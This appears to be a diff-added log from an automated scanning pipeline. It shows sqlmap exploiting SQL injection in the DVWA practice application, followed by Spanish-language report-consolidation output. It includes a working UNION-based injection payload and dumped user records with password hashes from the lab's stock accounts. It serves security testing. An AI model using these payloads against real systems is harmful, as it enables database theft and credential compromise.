+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=7762' UNION ALL SELECT CONCAT(0x716b787671,0x4c48595174724b55624d70714f69434642446673654f42595a75517371556f72644f576a47727863,0x716b767a71),NULL#&Submit=Submit
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[02:24:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+[02:24:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[02:24:17] [INFO] fetching current database
+[02:24:17] [INFO] fetching tables for database: 'dvwa'
+[02:24:17] [INFO] fetching columns for table 'users' in database 'dvwa'
+[02:24:17] [INFO] fetching entries for table 'users' in database 'dvwa'
+[02:24:17] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [y/N/q] N
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                      | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /hackable/users/admin.jpg   | 903a98d709fa4683aaaa036b84c125a6 | admin     | admin      | 2026-08-02 02:23:43 | 0            |
+| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2026-08-02 02:20:20 | 0            |
+| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2026-08-02 02:20:20 | 0            |
+| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2026-08-02 02:20:20 | 0            |
+| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2026-08-02 02:20:20 | 0            |
++---------+---------+-----------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+[02:24:17] [INFO] table 'dvwa.users' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/users.csv'
+[02:24:17] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
+[02:24:17] [INFO] fetching entries for table 'guestbook' in database 'dvwa'
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+--------+-------------------------+
+| comment_id | name   | comment                 |
++------------+--------+-------------------------+
+| 1          | test   | This is a test comment. |
++------------+--------+-------------------------+
+
+[02:24:17] [INFO] table 'dvwa.guestbook' dumped to CSV file '/root/.local/share/sqlmap/output/dvwa/dump/dvwa/guestbook.csv'
+[02:24:17] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-08022026_0224am.csv'
+
+[*] ending @ 02:24:17 /2026-08-02/
+
+--- Escaneo finalizado ---
+============================================================
+INICIANDO CONSOLIDACIÓN ASÍNCRONA DE SQLMAP
+============================================================
+[*] Leyendo log de SQLMap: /app/output/raw/sqlmap_bg.log
+[+] Se parsearon 8 vulnerabilidades de SQLMap.
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP (param: username)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP (param: username)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP (param: username)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/brute/?Login=Login&password=ZAP&username=ZAP (param: username)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP (param: id)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP (param: id)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP (param: id)
+    - Guardando vuln: SQL Injection en http://dvwa/vulnerabilities/sqli/?Submit=Submit&id=ZAP (param: id)
+[*] Actualizando reporte consolidado: /app/output/raw/resultado_unificado.json
+[✓] resultado_unificado.json actualizado con éxito.
+[*] Regenerando reportes en formato Markdown y Texto...
+[+] Reporte técnico generado exitosamente en: /app/output/reports/reporte_seguridad.md
+[+] Reporte para cliente generado exitosamente en: /app/output/reports/reporte_cliente.md
+[✓] Reportes de seguridad regenerados.
